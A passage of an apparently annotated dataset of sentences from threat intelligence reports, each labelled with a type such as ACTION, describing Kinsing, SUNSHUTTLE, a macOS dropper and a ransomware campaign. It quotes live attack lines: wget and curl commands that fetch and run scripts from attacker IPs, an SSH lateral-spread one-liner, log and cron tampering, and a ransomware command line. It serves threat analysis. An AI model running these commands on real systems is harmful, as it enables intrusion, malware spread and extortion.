        "text": "- Check of the MD5 hashes of the original source code and of the backdoored source code to ensure the tampering will not cause build errors\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S57",
        "text": "- Attempt to open a non-existing mutex to detect when the malware operators want the backdoor to stop execution and safely exit\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S0",
        "text": "Taking advantage of the unprotected open Docker API port, the attackers are able to instantiate an Ubuntu container with the following entry point: /bin/bash -c apt-get update && apt-get install -y wget cron;service cron start; wget -q -O - 142.44.191.122/d.sh | sh;tail -f /dev/null",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S1",
        "text": "We saw this entry point in every attack in this campaign, with the only change being the IP address that d.sh is downloaded from.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S2",
        "text": "We witnessed 3 IP addresses used in total--the one in the example above, 217.12.221.244 and 185.92.74.42\n",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S3",
        "text": "The command does the following:",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S4",
        "text": "- Update packages with apt-get update",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S5",
        "text": "- Install wget with apt-get\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S6",
        "text": "- Start the cron service.\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S7",
        "text": "- Download a shell script with the just installed wget\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S8",
        "text": "- Run the shell script and read indefinitely from /dev/null to keep the container alive and running\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S9",
        "text": "We can see that the wget program was required to download the cron shell script.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S10",
        "text": "The script would be later used in order to gain persistency within the container.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S11",
        "text": "The shell script d.sh, referred to from hereon as 'the shell script\u2019, contains more than 600 lines.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S12",
        "text": "We discovered that the shell script does the following:",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S13",
        "text": "- Disables security measures and clears logs: echo SELINUX=disabled >/etc/selinux/config \n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S14",
        "text": "- Kills numerous applications, notably other malwares and cryptominers.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S15",
        "text": "- Deletes files related to other malwares/cryptominers, most of them from the /tmp directory \n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S16",
        "text": "- Kills running rival malicious Docker containers and deletes their image. \n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S17",
        "text": "- Downloads the \u2018kinsing\u2019 malware and runs it \n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S18",
        "text": "- Uses crontab to download and run the shell script every minute \n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S19",
        "text": "- Looks for other commands running in cron, and if ones were identified, deletes all cron jobs, including its own.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S20",
        "text": "We are not certain why the attackers chose to do so, but that is what the script executes: crontab -l | sed '/update.sh/d' | crontab -.\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S21",
        "text": "Kinsing is a Linux agent, identified by Virus Total after we submitted it for analysis.",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S22",
        "text": "From here on we\u2019ll refer to the malware as kinsing.\n",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S23",
        "text": "A quick look at the malware\u2019s strings reveals that it is a Golang-based Linux agent.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S24",
        "text": "It uses several Go libraries, including:\n",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S25",
        "text": "- go-resty \u2013 an HTTP and REST client library, used to communicate with a Command and Control (C&C) server.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S26",
        "text": "- gopsutil \u2013 a process utility library, used for system and processes monitoring.\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S27",
        "text": "- osext \u2013 extension to the standard \u2018os\u2019 package, used to execute binaries.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S28",
        "text": "- extension to the standard \u2018os\u2019 package, used to execute binaries.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S29",
        "text": "diskv - A disk-backed key-value store, for storage.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S30",
        "text": "Running the malware in a controlled environment and monitoring it brought up more details about its malicious actions.",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S31",
        "text": "Before the malware proceeded to deploy its payload, it attempted to communicate with servers in Eastern Europe.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S32",
        "text": "It appears that there are dedicated servers for each function that the malware executes:",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S33",
        "text": "- Attempts to establish a connection with the following IP address: 45.10.88.102.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S34",
        "text": "The attempts fail as the server does not respond.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S35",
        "text": "- Connects to 91.215.169.111, which appears to be the main C&C server.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S36",
        "text": "The malware communicates with that host over HTTP port 80, and sends small encrypted messages on regular intervals, every few seconds.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S37",
        "text": "- Connects to 217.12.221.244/spre.sh, which we presume stands for spread, as we will see in the next paragraph, to download a shell script used for lateral movement purposes.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S38",
        "text": "- Connects to 193.33.87.219 to download the cryptominer C&C communication.\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S39",
        "text": "The spre.sh shell script that the malware downloads is used to laterally spread the malware across the container network.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S40",
        "text": "In order to discover potential targets and locate the information it needs to authenticate against, the script passively collects data from /.ssh/config, .bash_history, /.ssh/known_hosts, and the likes.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S41",
        "text": "We did not identify any active scanning techniques used to identify additional targets.",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S42",
        "text": "Using the information gathered, the malware then attempts to connect to each host, using every possible user and key combination through SSH, in order to download the aforementioned shell script and run the malware on other hosts or containers in the network.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S43",
        "text": "The actual shell script is named spr.sh this time around, but it is identical to the a d.sh shell script used earlier in the attack sequence\n",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S44",
        "text": "The following SSH command was used to spread it throughout the network: ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key $user@$host -p$sshp \"sudo curl -L http://217.12.221.244/spr.sh|sh; sudo wget -q -O - http://217.12.221.244/spr.sh|sh;\"\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S45",
        "text": "We noticed a comment in the script for a 20 seconds sleep after every 20 SSH connection attempts, and their cleanup, possibly indicating that the attackers have some sense of evasion and were trying to hide their activities.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S46",
        "text": "At the last stage of the attack the malware runs a cryptominer called kdevtmpfsi.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S47",
        "text": "The cryptominer was identified by Virus Total as a Bitcoin miner.",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S48",
        "text": "The cryptominer connects to a host with the 193.33.87.219 IP address using a log in request over HTTP, receives further instructions, and starts mining cryptocurrency.\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S0",
        "text": "As pointed out in Malwarebytes\u2019s public report, the actor sent weaponized documents to the victim as an initial infection vector.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S1",
        "text": "The documents use sophisticated infection methods to try to impede detection.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S2",
        "text": "The initial infection can be summarized like this:",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S3",
        "text": "- The user opens the malicious document and subsequently allows the macro to be executed; \n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S4",
        "text": "- A popup message box appears; \n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S5",
        "text": "- The current document gets saved to the path %temp% as HTML and accordingly stores all image files separately within the same directory; \n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S6",
        "text": "- Show decoy document; \n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S7",
        "text": "- Convert %temp%[document name]\\image003.png to the BMP file format and add the extension .zip; \n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S8",
        "text": "- Execute image003.zip, which actually contains HTML Application (HTA) code, with mshta.exe; \n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S9",
        "text": "- Remove previously created, temporary files.\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S10",
        "text": "The executed image003.zip is an HTML Application (HTA) file containing the second stage payload.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S11",
        "text": "This HTA code creates the next payload at the hardcoded path C:/Users/Public/Downloads/Winvoke.exe.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S12",
        "text": "Besides the Microsoft Word document, the actor used an additional, alternative infection method according to our telemetry.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S13",
        "text": "Although we weren\u2019t able to acquire the initial file, we assume the actor delivered a file disguised as a PDF, since we discovered artefacts containing the path of the tool ezPDFReader: c:\\program files (x86)\\unidocs\\ezpdfreader2.0g\\ezpdfwslauncher.exe.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S14",
        "text": "This software is developed by a South Korean software company named Unidocs.",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S15",
        "text": "At this point, we\u2019re missing clear evidence of whether the attack leveraged a vulnerability within this software in the infection process or it was used to deceive users by opening a PDF document as a decoy while the HTA payload is fetched from a remote resource.",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S16",
        "text": "Notably, the compromised website www.allamwith[.]com was used for a long period of time.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S17",
        "text": "We first saw the URL appearing in the context of this threat actor in September 2020 and it was still in use when we were researching this series of attacks at the end of April 2021.",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S18",
        "text": "When we analyzed the above malicious URLs, many of the resources had already gone offline, but the attacker is still using one distribution URL: hxxp://www.allamwith[.]com/home/css/skin.html",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S19",
        "text": "The URL hosts still serving the HTML Application (HTA) file exhibit similar functions as the HTA file created by the malicious Word document.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S20",
        "text": "However, in the case of remotely fetched HTA code with PDF-style attacks, the next payload gets dropped to a different hardcoded path, located at C:/users/public/iexplore.exe, and eventually executed.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S21",
        "text": "The second stage payload is responsible for communicating with the C2 server and preparing another payload for the next stage.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S22",
        "text": "This second stage malware decrypts the embedded payload at runtime.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S23",
        "text": "It uses an embedded 16-byte XOR key to decrypt the base64 encoded payload.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S24",
        "text": "The decrypted payload is another portable executable file that runs in memory.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S25",
        "text": "The infection procedure of the second stage payload:",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S26",
        "text": "- Create mutex named Microsoft32. \n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S27",
        "text": "- Resolve API address: base64 decoding + RC4 decryption with the key MicrosoftCorporationValidation@#$%^&*()!US \n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S28",
        "text": "- Retrieve C2 addresses: base64 decoding + custom XOR decryption.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S29",
        "text": "- Communication with C2.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S30",
        "text": "According to the response from the C2 server, the payload is able to perform five actions:",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S31",
        "text": "The malware operator appears to deliver the third stage payload by using the above functionalities, as our telemetry reveals.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S32",
        "text": "Both second and third stage payloads also share an identical icon, which looks like Internet Explorer.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S33",
        "text": "The third stage payload was created via the second stage payload, is interactively executed in the operation and exists in both x64 and x86 versions.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S34",
        "text": "Most of them use Internet Explorer or Google Chrome icons and corresponding file names to disguise themselves as legitimate internet browsers.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S35",
        "text": "The third stage decrypts the embedded payload and executes it.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S36",
        "text": "The embedded payload shows the same structure as the second stage payload discussed above.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S37",
        "text": "Once launched, it checks for the mutex QD33qhhXKK and inspects the system for signs of a sandbox environment by searching for the presence of specific modules.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S38",
        "text": "The strings of module names to be checked are decoded with a hardcoded XOR key: 0x4B762A554559586F6A45656545654130\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S39",
        "text": "- sbiedll.dll: Sandboxie module",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S40",
        "text": "- api_log.dll: SunBelt SandBox module",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S41",
        "text": "- dir_watch.dll: SunBelt SandBox module",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S42",
        "text": "With the environment checks done, the main payload gets decrypted using the same XOR key and launched with rundll32.exe.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S43",
        "text": "Three C2 addresses then get extracted and decrypted using DES, with all addresses pointing to the same IP (23.229.111[.]197) in this sample.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S44",
        "text": "The malware then sends a hardcoded string to the C2 server: \u201cHTTP 1.1 /member.php SSL3.4\u201d.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S45",
        "text": "Next, it checks if the C2\u2019s response data equals \u201cHTTP 1.1 200 OK SSL2.1\u201d and, if positive, starts conducting its backdoor operations.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S46",
        "text": "The samples contain debug data and thereby expose function names disclosing their purpose:\n",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S47",
        "text": "- ModuleUpdate: Replace the current module with a batch file",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S48",
        "text": "- ModuleShell: Execute Windows command, changes working directory, Connect to given IP address",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S49",
        "text": "- ModuleFileManager: Get disk information, File listing, File manipulation",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S50",
        "text": "- ModuleScreenCapture: Take a screenshot",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S51",
        "text": "Interestingly, one victim was discovered to have received ransomware after the third stage payload.",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S52",
        "text": "This ransomware sample is custom made and specifically developed by the threat actor behind this attack.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S53",
        "text": "This ransomware is controlled by command line parameters and can either retrieve an encryption key from the C2 or, alternatively, as an argument at launch time.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S54",
        "text": "We saw the malware executed with the following parameter options in our telemetry, with some parameters illustrated below: c:\\temp\\mshelp.exe d:\\ -s 23.229.111[.]197 3569 sanjgold847@protonmail[.]com 12345 12345FDDEE5566778899AABB 1 c : \\ temp \\ mshelp .",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S55",
        "text": "exe d : \\ - s 23.229.111 [ . ] 197 3569 sanjgold847 @ protonmail [ . ] com 12345 12345FDDEE5566778899AABB",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S56",
        "text": "Upon launch, the ransomware checks the number of parameters.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S57",
        "text": "If the number of arguments is less than six, the malware terminates itself.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S58",
        "text": "If there is no extension for the encrypted files specified, the malware uses a default extension (.3nc004) and a default file name for the ransom note (3nc004.txt).",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S59",
        "text": "If the victim ID is left unspecified, the ransomware generates a random ID 24 characters long.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S60",
        "text": "If the malware is executed with the -s(-S) option, it sends the victim ID to the C2 server and receives the initial vector (IV) and key to encrypt files.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S61",
        "text": "Each of the strings has a length of 32 characters.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S62",
        "text": "When the ransomware communicates with the C2 server, it uses the same authentication process and strings as the third stage payload.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S63",
        "text": "The ransomware uses an AES-128 CBC mode algorithm to encrypt files on the victim machine.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S64",
        "text": "With the exception of system-critical files (\u201c.exe\u201d, \u201c.dll\u201d, \u201c.sys\u201d, .\u201dmsiins\u201d, and \u201c.drv\u201d extensions), the malware encrypts files completely, irrespective of file size.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S65",
        "text": "However, since important system configuration files are affected by the encryption procedure as well, it can lead to an unstable system.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-124.md:::S66",
        "text": "As a final step, it leaves a ransom note on the desktop and in the startup folder and opens it with notepad.exe.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S0",
        "text": "Once executed, the SUNSHUTTLE backdoor enumerates the victim\u2019s MAC address and compares it to a hardcoded MAC address value \u201cc8:27:cc:c2:37:5a\u201d.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S1",
        "text": "If a match is found the backdoor exits.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S2",
        "text": "The MAC address is likely a default MAC address for the Windows sandbox network adapter.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S3",
        "text": "If the check is successful, the SUNSHUTTLE backdoor then enters a routine named \u201c\ufeffmain_define_internal_settings\u201d, which handles creation of the configuration file if one doesn\u2019t already exist in the directory from which SUNSHUTTLE is running.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S4",
        "text": "For the sample analyzed, the configuration filename is \u201cconfig.dat.tmp\u201d.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S5",
        "text": "The configuration data is Base64 encoded and AES-256 encrypted using the following key: hz8l2fnpvp71ujfy8rht6b0smouvp9k8\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S6",
        "text": "The configuration has the following example values when Base64 decoded and AES decrypted:\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S7",
        "text": "The configuration holds several values delimited by a \u201c|\u201d character, which are briefly described as follows.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S8",
        "text": "If set in the configuration, the \u201cblend-in\u201d traffic occurs as the malware executes and transitions through its routines.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S9",
        "text": "The following URLs are leveraged for the \u201cblend-in\u201d requests:",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S10",
        "text": "SUNSHUTTLE performs initial requests to the C2 in order to request and then retrieve what it internally refers to as a session key.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S11",
        "text": "The retrieved session key from the C2 appears to be RSA decrypted using the following private key that is embedded in SUNSHUTTLE and believed to be unique per compiled sample.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S12",
        "text": "Analysis is on-going on how the decrypted session key is used, but it is likely a session key used to encrypt content once SUNSHUTTLE transitions to its command-and-control routines.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S13",
        "text": "After the configuration is created or read from, SUNSHUTTLE enters a routine named \u201c\ufeffmain_request_session_key\u201d.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S14",
        "text": "The malware will iterate over this routine until it\u2019s successful, sleeping a period of time after each iteration.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S15",
        "text": "Inside the \u201c\ufeffmain_request_session_key\u201d routine, SUNSHUTTLE constructs an HTTPS request to its configured C2.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S16",
        "text": "Upon an HTTP 200 response from the request, the response data from the C2 is expected to not contain the following string for the sample analyzed: ywQdjLuHHC\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S17",
        "text": "The request_session_key routine returns a 1 if the string is not in the response and a -1 if it is in the response.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S18",
        "text": "If the result of the request_session_key is 1, SUNSHUTTLE will execute the retrieve_session_key routine.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S19",
        "text": "The retrieve_session_key routine again contacts the C2 and downloads content that is expected to be decrypted by the aforementioned embedded private key.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S20",
        "text": "The decrypted content is likely a session key used to encrypt content once SUNSHUTTLE transitions to its command-and-control routines.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S21",
        "text": "Once a session key is retrieved from the C2, SUNSHUTTLE begins the beaconing and \u201cresolve_command\u201d routines in a loop.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S22",
        "text": "SUNSHUTTLE first issues a beacon to retrieve a command.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S23",
        "text": "After, SUNSHUTTLE will enter the routine \u201cresolve_command\u201d, which parses the response content to determine which command should be run.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S24",
        "text": "Available commands include remotely updating its configuration, file upload and download, and arbitrary command execution.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S25",
        "text": "The content returned from the C2 after the \u201cmain_beaconing\u201d routine is Base64 decoded and AES decrypted",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S26",
        "text": ".",
        "type": "IRRELEVANT"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S27",
        "text": "A check is performed to ensure the decrypted content doesn\u2019t contain the following string: Cp5RTQ31R1\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S28",
        "text": "As noted, it is likely these strings are unique per sample and randomly generated at compilation.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S29",
        "text": "The decrypted content is parsed for certain unique strings.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S30",
        "text": "After successful execution of the malware, it drops the following files to the victim\u2019s system: <current_directory>\\config.dat.tmp (MD5: Dynamic) Encrypted configuration file",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S31",
        "text": "The SUNSHUTTLE malware was not observed setting its own persistence.",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S32",
        "text": "It is likely the persistence is set outside of the execution of SUNSHUTTLE.",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S33",
        "text": "SUNSHUTTLE uses the cookie header to pass values to the C2.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S34",
        "text": "Additionally, a referrer is selected from the following list, presumably to make the traffic blend in if traffic is being decrypted for inspection:",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S35",
        "text": "- www.bing.com",
        "type": "URL"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S36",
        "text": "- www.yahoo.com",
        "type": "URL"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S37",
        "text": "- www.google.com",
        "type": "URL"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S38",
        "text": "- www.facebook.com",
        "type": "URL"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S39",
        "text": "The cookie headers vary slightly depending on the operation being performed.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-150.md:::S40",
        "text": "The following is an example request to the C2 from the \u201crequest_session_key\u201d routine.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S0",
        "text": "The malware is delivered as an application disguised as an MS Office Word doc.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S1",
        "text": "The previous research noted that the malware deploys a novel trick to prevent MS Office attempting to launch the disguised app as a doc by embedding a unicode character in the file name.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S2",
        "text": "This causes launch services to call \u201copen\u201d on the file rather than the default program for \u201c.doc\u201d.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S3",
        "text": "On launch, the malware switches out the malicious application bundle for an actual MS Office doc: the same file name is used but now minus the hidden Unicode character.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S4",
        "text": "After the bait and switch, this doc is launched and presented to the user.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S5",
        "text": "The whole trick is invisible to the user, who only sees a document appearing with the same name as the one they double-clicked on.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S6",
        "text": "Meanwhile, the second stage payload has been deposited in the /tmp folder and begins its run to install a hidden persistence agent and the third stage malicious executable.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S7",
        "text": "That trick is accompanied by the borrowing of a technique that has become popular among commodity adware and malware distributors; namely, using a shell script both as the main executable inside the app bundle and also as a vehicle to drop an embedded base64-encoded payload.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S8",
        "text": "Note line 4, which defines a variable with around 850Kb of base64-encoded data.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S9",
        "text": "At line 40, that data is piped through the base64 utility for decoding, dropped in a subfolder in the /tmp directory, given executable permissions via chmod , and then launched as the 2nd stage payload.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S10",
        "text": "Importantly, prior to line 40, the script takes measures to deal with two macOS security features: App Translocation and file quarantine.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S11",
